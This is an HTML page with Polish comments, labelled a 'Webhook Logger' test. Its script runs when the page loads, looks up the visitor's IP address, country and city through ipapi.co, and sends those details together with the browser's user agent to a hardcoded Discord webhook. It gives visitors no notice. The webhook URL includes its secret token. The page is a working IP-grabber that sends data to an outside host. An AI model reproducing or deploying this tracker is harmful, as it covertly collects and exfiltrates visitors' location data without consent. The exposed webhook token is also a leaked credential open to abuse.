<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <title>Webhook Logger - HTML + JS</title>
</head>
<body>
  <h1>Webhook Logger - Test</h1>
  <p>Przykładowa strona wysyłająca dane do Discord Webhook.</p>

  <script>
    // Funkcja pobierająca dane IP i wysyłająca je do Discord Webhook
    function sendWebhook() {
      // Pobranie danych o IP za pomocą API ipapi.co
      fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
          const ip = data.ip;
          const country = data.country_name;
          const city = data.city;
          const userAgent = navigator.userAgent;
          const timestamp = new Date().toISOString();

          // Przygotowanie treści wiadomości (możesz dostosować formatowanie)
          const message = `**Nowy użytkownik odwiedził stronę!**\n` +
                          `IP: ${ip}\n` +
                          `User Agent: ${userAgent}\n` +
                          `Kraj: ${country}\n` +
                          `Miasto: ${city}\n` +
                          `Czas: ${timestamp}`;

          // Adres Twojego Discord Webhooka
          const webhookUrl = "https://discordapp.com/api/webhooks/1338865518135873537/3M6zHVt24Z5__4wfsz_7PQ43NVc1GHOPSD9aIlvlN7Cn78SEc3jUYEhUbjD0H70ReNqA";

          // Wysyłamy dane do Discord Webhook
          fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({ content: message })
          })
          .then(response => {
            if (response.ok) {
              console.log("Dane zostały wysłane do Discord Webhook.");
            } else {
              console.error("Błąd przy wysyłaniu danych do Discord Webhook.");
            }
          })
          .catch(error => {
            console.error("Błąd przy wysyłaniu żądania:", error);
          });
        })
        .catch(error => {
          console.error("Błąd przy pobieraniu danych IP:", error);
        });
    }

    // Uruchamiamy funkcję wysyłania przy załadowaniu strony
    sendWebhook();
  </script>
</body>
</html>
